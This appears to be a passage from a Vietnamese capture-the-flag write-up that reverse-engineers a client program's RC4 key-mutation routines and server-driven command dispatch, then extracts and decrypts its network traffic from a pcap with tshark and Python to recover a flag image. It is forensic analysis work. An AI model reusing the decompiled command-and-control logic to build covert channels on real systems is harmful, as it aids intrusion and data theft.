_BYTE *__cdecl gen2(const char *a1)
{
  signed int v1; // esi
  _BYTE *v2; // edx
  int i; // ecx

  v1 = strlen(a1);
  v2 = (_BYTE *)sub_10001210(v1 + 1);
  *v2 = a1[v1 - 1];
  for ( i = 1; i < v1; ++i )
    v2[i] = a1[i - 1];
  v2[v1] = 0;
  return v2;
}
```
```cpp
int __cdecl gen3(const char *a1)
{
  int v1; // esi
  int result; // eax
  int v3; // ebx
  _BYTE *v4; // edi
  char v5; // cl
  char v6; // dl
  const char *v7; // [esp+10h] [ebp-4h]

  v1 = strlen(a1);
  result = sub_10001210(v1 + 1);
  if ( v1 > 0 )
  {
    v7 = &a1[-result];
    v3 = v1;
    v4 = (_BYTE *)result;
    do
    {
      v5 = v4[(_DWORD)v7];
      if ( (unsigned __int8)(v5 - 65) > 0x19u )
      {
        if ( (unsigned __int8)(v5 - 97) > 0x19u )
          v6 = v4[(_DWORD)v7];
        else
          v6 = (v5 - 84) % 26 + 97;
      }
      else
      {
        v6 = (v5 - 52) % 26 + 65;
      }
      *v4++ = v6;
      --v3;
    }
    while ( v3 );
  }
  *(_BYTE *)(result + v1) = 0;
  return result;
}
```
- gen0 : Đảo string.
- gen1 : Đổi chữ hoa thành chữ thường và ngược lại.
- gen2 : Lấy kí tự cuối đảo lên vị trí đầu.
- gen3 : ROT13.

Vào lại ct chính ở `sub_402E80`
```cpp
int __stdcall sub_402E80(int **a1)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v3; // esi
  void *v5; // edx
  int *v6; // eax
  int v7; // ecx
  int v8; // ecx
  char v9; // [esp+13h] [ebp-1h] BYREF

  if ( *(_DWORD *)(sub_401480() + 400) == -1 || !*(_DWORD *)dword_4203B4 )
  {
    a1[1][46] += 5;
    return -1;
  }
  v1 = **a1;
  if ( v1 == -1073741819 )
  {
    v2 = (_DWORD *)dword_420394;
    qmemcpy(dword_420398, a1[1], 0x2CCu);
    if ( dword_42035C <= (int)(*v2 / (unsigned int)dword_41F8B0) )
    {
      v3 = sub_401480();
      if ( !(*(int (__stdcall **)(_DWORD, char *, int, _DWORD))(v3 + 488))(*(_DWORD *)(v3 + 400), &v9, 1, 0) )
      {
        *(_DWORD *)(v3 + 400) = 0;
        *(_BYTE *)(v3 + 496) = 0;
      }
      switch ( v9 )
      {
        case 0:
          a1[1][46] = (int)sub_402A40;
          return -1;
        case 1:
          a1[1][46] = (int)sub_402B50;
          return -1;
        case 2:
          a1[1][46] = (int)sub_402C60;
          return -1;
        case 3:
          a1[1][46] = (int)sub_402D70;
          return -1;
      }
    }
    return -1;
  }
  if ( v1 != -2147483645 )
    return -1;
  v5 = dword_420398;
  if ( !*((_DWORD *)dword_420398 + 46) )
    return -1;
  qmemcpy(a1[1], dword_420398, 0x2CCu);
  v6 = a1[1];
  v7 = v6[46];
  if ( dword_41F8B0 )
    v8 = v7 - 2;
  else
    v8 = v7 + 5;
  v6[46] = v8;
  memset(v5, 0, 0x2CCu);
  return -1;
}
```
Ct sẽ lấy bytes được gửi từ server dùng cho các cases

Tại số 25 nó sẽ gửi đến client case 2 

<img width="1920" height="413" alt="{341554C2-0417-425C-8F39-FA5932D47B60}" src="https://github.com/user-attachments/assets/205e7cc4-71ac-4dbf-911f-f042c0aa1717" />

Tức là case 2

Vậy tiếp theo mình sẽ sử dụng tshark để xem hết các command nó gửi đến cilent 
```bash
tshark -r record.pcapng \
-Y "ip.src==192.168.89.136 && tcp.srcport==31337 && tcp.len==1" \
-T fields -e frame.number -e data
```
Mình sẽ có như sau 
```
25      02
761     01
1494    01
2227    02
2960    03
3693    02
4426    03
5159    01
5892    02
6625    03
7358    01
8091    00
8824    02
9557    03
10290   00
11023   00
11756   02
12489   01
13222   01
13955   00
14688   00
15421   03
```

Ta có thể thấy các cases là 
- `sub_402A40` = gen0
- `sub_402B50` = gen1
- `sub_402C60` = gen2
- `sub_402D70` = gen3 

và ct sẽ lấy key ban đầu đưa vào các gen0123 ra key mới
```py
key = "WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM"

def gen0(s: str) -> str:
    return s[::-1]

def gen1(s: str) -> str:
    result = []
    for c in s:
        if c.islower():
            result.append(c.upper())
        elif c.isupper():
            result.append(c.lower())
        else:
            result.append(c)
    return ''.join(result)

def gen2(a1: str) -> str:
    return a1[-1] + a1[:-1] if a1 else ''

def gen3(s: str) -> str:
    result = []

    for c in s:
        if 'a' <= c <= 'z':
            shifted = (ord(c) - ord('a') + 13) % 26
            result.append(chr(shifted + ord('a')))

        elif 'A' <= c <= 'Z':
            shifted = (ord(c) - ord('A') + 13) % 26
            result.append(chr(shifted + ord('A')))

        else:
            result.append(c)

    return ''.join(result)

print("gen0  :", gen0(key))
print("gen1  :", gen1(key))
print("gen2  :", gen2(key))
print("gen3  :", gen3(key))
```
```
gen0  : MnbivxwTqsaDwDmDPlufDqJXpDVbgekuzKrOddMKVymjiawsFZrqPNqfaJbWjPTW
gen1  : wtpJwBjAFQnpQRzfSWAIJMYvkmDDoRkZUKEGBvdPxjQdFULpdMdWdASQtWXVIBNm
gen2  : MWTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibn
gen3  : JGCwJoWnsdACdeMSfjnvwzlIXZqqBeXmhxrtoIQcKWdQshyCQzQjQnfdGjkivoaZ
```
Giờ mình sẽ dump data 

Vd: số 27 -> 760 là của case 2 và dump cho đến hết tất cả các case
```py
import subprocess
import os
import sys

PCAP = "record.pcapng"
OUT  = "chunks"
CLIENT_IP  = "192.168.89.1"
SERVER_PORT = 31337

MARKERS = [
    (25,    0x02),
    (761,   0x01),
    (1494,  0x01),
    (2227,  0x02),
    (2960,  0x03),
    (3693,  0x02),
    (4426,  0x03),
    (5159,  0x01),
    (5892,  0x02),
    (6625,  0x03),
    (7358,  0x01),
    (8091,  0x00),
    (8824,  0x02),
    (9557,  0x03),
    (10290, 0x00),
    (11023, 0x00),
    (11756, 0x02),
    (12489, 0x01),
    (13222, 0x01),
    (13955, 0x00),
    (14688, 0x00),
    (15421, 0x03),
]

LAST_FRAME = 16659 

def extract_chunk(pcap, out_dir, idx, marker_frame, oracle_val, end_frame):
    start = marker_frame + 2

    display_filter = (
        f"ip.src == {CLIENT_IP} && "
        f"tcp.dstport == {SERVER_PORT} && "
        f"tcp.len > 0 && "
        f"frame.number >= {start} && "
        f"frame.number <= {end_frame}"
    )

    out_path = os.path.join(out_dir, f"data{idx}.txt")
    with open(out_path, "w") as f:
        subprocess.run(
            ["tshark", "-r", pcap,
             "-Y", display_filter,
             "-T", "fields", "-e", "data"],
            stdout=f, stderr=subprocess.DEVNULL, check=True
        )

    lines = open(out_path).read().strip().split("\n")
    lines = [l for l in lines if l]
    total_bytes = sum(len(l) // 2 for l in lines)
    print(f"[{idx:2d}] marker={marker_frame:5d}  oracle=0x{oracle_val:02x}  "
          f"frames {start}..{end_frame}  segs={len(lines):3d}  bytes={total_bytes} (0x{total_bytes:06x})"
          f"  -> {out_path}")
    return total_bytes


def main():
    pcap = sys.argv[1] if len(sys.argv) > 1 else PCAP
    os.makedirs(OUT, exist_ok=True)

    print(f"pcap  : {pcap}")
    print(f"output: {OUT}/\n")

    for i, (marker, val) in enumerate(MARKERS):
        if i + 1 < len(MARKERS):
            end = MARKERS[i + 1][0] - 1   
        else:
            end = LAST_FRAME
        extract_chunk(pcap, OUT, i, marker, val, end)

    print("\ndone.")


if __name__ == "__main__":
    main()
```
Script solve
```py
from arc4 import ARC4

keys = [
    b'MnbivxwTqsaDwDmDPlufDqJXpDVbgekuzKrOddMKVymjiawsFZrqPNqfaJbWjPTW',
    b'wtpJwBjAFQnpQRzfSWAIJMYvkmDDoRkZUKEGBvdPxjQdFULpdMdWdASQtWXVIBNm',
    b'MWTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibn',
    b'JGCwJoWnsdACdeMSfjnvwzlIXZqqBeXmhxrtoIQcKWdQshyCQzQjQnfdGjkivoaZ'
]
index = [2, 1, 1, 2, 3, 2, 3, 1, 2, 3, 1, 0, 2, 3, 0, 0, 2, 1, 1, 0, 0, 3]

total = b''
for i in range(22):
    with open(f"data{i}.txt", "r") as f:
        enc_data = bytes.fromhex(''.join(f.read().split()))
    cipher = ARC4(keys[index[i]])
    total += cipher.decrypt(enc_data)
    print(f"[{i:2d}] key={index[i]}  {len(enc_data):>7d} bytes  ok")

with open("flag.bmp", "wb") as f:
    f.write(total)
```

<img width="1856" height="639" alt="{E11548E1-3ADE-4388-B24C-066EE4ED6794}" src="https://github.com/user-attachments/assets/7af3d6a8-5799-4bfb-b9db-693b9a7b0c26" />









